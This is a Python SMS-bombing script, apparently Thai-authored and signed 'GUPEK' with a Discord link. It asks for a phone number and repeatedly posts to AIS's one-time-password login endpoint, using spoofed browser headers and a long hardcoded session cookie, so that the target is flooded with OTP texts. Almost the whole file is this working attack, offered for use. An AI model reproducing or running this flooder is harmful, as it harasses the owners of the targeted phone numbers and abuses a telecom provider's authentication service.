#SCRIPT BY GUPEK
#Discord : https://discord.gg/RC4KEDakbd


#ไม่มีอะไรให้ส่องหรอก



import requests,json,time,threading


#SCRIPT BY GUPEK


import requests,json,time,threading,os,sys


#SCRIPT BY GUPEK


import urllib.request, os, threading, time, random, sys


#SCRIPT BY GUPEK


import colorama


#SCRIPT BY GUPEK


from colorama import Fore, Style, init


#SCRIPT BY GUPEK


session = requests.Session()


#SCRIPT BY GUPEK


os.system("clear")


#SCRIPT BY GUPEK


os.system("figlet SPAM SMS")


#SCRIPT BY GUPEK


os.system("figlet API AIS")


#SCRIPT BY GUPEK


print("\033[1;92m          •{ FLOOD SMS BY GUPEK }•")


#SCRIPT BY GUPEK


print("\n\033[1;95m        [+] | API  : 1 api\n        [+] | ดีเลย์ : 1 วิ\n")


#SCRIPT BY GUPEK


print("\n\033[1;94m  **Discord : https://discord.gg/RC4KEDakbd**\033[1;97m\n")


#SCRIPT BY GUPEK


print ("         > ตัวอย่าง = \033[1;92m66899999999 \033[1;97m< \n")


#SCRIPT BY GUPEK


number = input("\033[90m> \033[1;91m[+] | PhoneNumber => \033[1;92m66")


#SCRIPT BY GUPEK


os.system("clear")


#SCRIPT BY GUPEK


os.system("figlet By GuPek")


#SCRIPT BY GUPEK


print("\n\033[1;92m          •{ FLOOD SMS BY GUPEK }•")


#SCRIPT BY GUPEK


print("\n\033[1;95m        [+] | API  : 1 api\n        [+] | ดีเลย์ : 1 วิ\n")


#SCRIPT BY GUPEK


print("\n\033[1;94m  **Discord : https://discord.gg/RC4KEDakbd**\033[1;97m\n")


#SCRIPT BY GUPEK


print("\n\033[1;92mอย่าเอาไปขายไอสัส อย่าเอาไปขายไอสัส อย่าเอาไปขายไอสัส")


#SCRIPT BY GUPEK


num = int("" + number)


#SCRIPT BY GUPEK


class SMS():
	
	
#SCRIPT BY GUPEK


    def spamais(self,num):
    	
    
#SCRIPT BY GUPEK


        url = "https://srfng.ais.co.th/login/sendOneTimePW"
        
        
#SCRIPT BY GUPEK


        data = f"msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
        
        
 #SCRIPT BY GUPEK
 
 
        headers = {
        
        
#SCRIPT BY GUPEK


                    "Host": "srfng.ais.co.th",
                    
                    
 #SCRIPT BY GUPEK
 
 
                    "Connection": "keep-alive",
                    
 #SCRIPT BY GUPEK


                    "Content-Length": "67",
                    
 #SCRIPT BY GUPEK


                    "Accept": "*/*",
                    
 #SCRIPT BY GUPEK


                    "X-Requested-With": "XMLHttpRequest", 
                    
 #SCRIPT BY GUPEK


                    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36", 
                    
 #SCRIPT BY GUPEK


                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    
 #SCRIPT BY GUPEK


                    "Origin": "https://srfng.ais.co.th",
                    
 #SCRIPT BY GUPEK


                    "Sec-Fetch-Site": "same-origin",
                    
 #SCRIPT BY GUPEK


                    "Sec-Fetch-Mode": "cors",
                    
 #SCRIPT BY GUPEK


                    "Sec-Fetch-Dest": "empty",
                    
 #SCRIPT BY GUPEK


                    "Referer": "https://srfng.ais.co.th/8WXNShEVNCGn0o3%2BN6pPqiW5KfoLSNBvVqkqoQCl%2Bc4%3D?channel=webview&redirectURL=http%3A%2F%2Fakdev.vidnt.com&httpGenerate=generated",
                    
 #SCRIPT BY GUPEK


                    "Accept-Encoding": "gzip, deflate",
                    
 #SCRIPT BY GUPEK


                    "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
                    
 #SCRIPT BY GUPEK


                    "Cookie": "_chunk=1; ol3-0=po2YOaPtZc%252BHZHeVG7D7ZG%252BLV3UUNnejYANfRIc2aJod7cBWn4witm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545pslib3M%252FI2DYESmolC484IfK0uXD5D0rC%252Fo5%252FO%252BMvAmKevq9L6vW8pFbvG%252B5q%252BBInKvYPJ%252BOxCyzMixWbOUnOW4axJtZp3grN474ew9v4UFkdU8VUGoXKVhldzaK9%252BxYuJBdY2Jfzqf%252FsVIYv3uE4RmGzzoeCrQ7QXZm0uH6t3j1yF63KOQX4QwOmpG526ym0Sh%252BXLWQFhxnbuquuA8N7cumFvTTi7oWHt4W8mJQ4IN1GvS0iHlBQHgvnEkjGRlCtB%252FJ07aNkfBWlLrwb1zgQI88OkOrtTDDUdsIUSVdy7r5pOILz6rcT8kC%252FGqneTshPK9RF4PHxrBSDIPlQIVXJI6dxsiAr5H3UfAAa5FsfN8samV5qyQTgm3s9SC4w83uM1twiFJtarImPcx41vDFL7NF4yy7Ej7eSY%252FFyqLQuoCKDPhxlyOaH8mRoseOkpdQI0Bp4z75t0NlP%252B4YIV4EKmRueIktZmOk5c0I1SLC3bZ240Wshg7rbP6IgtwFEzWrOoIAGpfWHDjYjI8oiMpQX98aBtbtZA9sKvIDrY%252FdQqDsP4vDSPy3n1zb8pXhqaKLkDaAWih%252Ba6BX3FkEdn4fPrzZrNPfuHRC3hfSV51Jz4t3RxTPUlOS8goU8VSmQF%252F9wQEaLAkVR3F4sGzn1GH1fesp46wBbSOSkWNCEIu%252F%252B1VTElnOqnPSntHsUmow7jMst3uCb7Z9mNj%252Bo4RQM0oEuf39FLtPgIWMfYBXSEQXOXUeO2%252BYXI9OUFORSQBJy1kZcTPw2gjR4ZYrkaWKgqCo5jtIclLeDiLqzdBKYjupRC3%252BFXgL0SDchuE%252BD3XaNJ1YH2SVg0UzxbOIg6aIBxcIhakpSZw2w0jjPL1c1YG%252BAgVvT%252BeNL%252FzHr%252FeiqQkFjNI%252F64fvurU75Qy53GSlOBBvQTMhg0q11qYi4QMaxf2V%252FQ1TY3QLnfXiYKCq60Gh9gSACyjrf8thXVYUYheRWz2jM%252BotOvz%252FZwIbXf4SPGR71PK7X%252F2a30w01XgOvYf9dxC%252F9pWn4yNxgl%252BPhoIXK%252Fj%252FQRofkDIdzr1VJ0%252Bq6aX66IuSuytQAwWsoB"
                    
 #SCRIPT BY GUPEK


        }
                    
 #SCRIPT BY GUPEK


        time.sleep(1)
                    
 #SCRIPT BY GUPEK


        send = session.post(url,data=data,headers=headers).json()
                    
 #SCRIPT BY GUPEK


        if send.get("msg") == "msg":
                    
 #SCRIPT BY GUPEK


            pass
                    
 #SCRIPT BY GUPEK


        else:
                    
 #SCRIPT BY GUPEK


            print(send.get("msg"))
                    
 #SCRIPT BY GUPEK


t = SMS()
                    
 #SCRIPT BY GUPEK


def loop(num):
                    
 #SCRIPT BY GUPEK


    for i in range(num):
                    
 #SCRIPT BY GUPEK


        t.spamais(num)
                    
 #SCRIPT BY GUPEK


        print("กำลังยิง => ปิ้วๆๆๆ")
                    
 #SCRIPT BY GUPEK


loop(num)
                    
 #SCRIPT BY GUPEK


def loop(num):
                    
 #SCRIPT BY GUPEK


    for i in range(num):
                    
 #SCRIPT BY GUPEK


        t.spamais(num)
                    
 #SCRIPT BY GUPEK


        print("กำลังยิง => ปิ้วๆๆๆ")
                    
 #SCRIPT BY GUPEK


loop(num)
                    
 #SCRIPT BY GUPEK

